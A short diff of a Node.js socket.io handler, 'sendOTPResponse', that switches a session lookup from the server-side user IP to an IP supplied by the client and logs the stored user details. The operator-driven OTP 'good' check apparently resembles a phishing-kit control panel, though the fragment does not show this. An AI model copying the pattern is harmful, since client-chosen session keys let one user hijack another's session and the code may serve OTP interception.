@@ -368,8 +368,8 @@ io.on('connection', (socket, req) => {
     })
 
     socket.on('sendOTPResponse', (data) => {
-        if (sessionStore.has(userIP)) {
-            let userDetails = sessionStore.get(userIP);
+        if (sessionStore.has(data.ip)) {
+            let userDetails = sessionStore.get(data.ip);
             console.log(userDetails);
             console.log(userDetails.getUserDataNavig);
             if(data.res == 'good'){
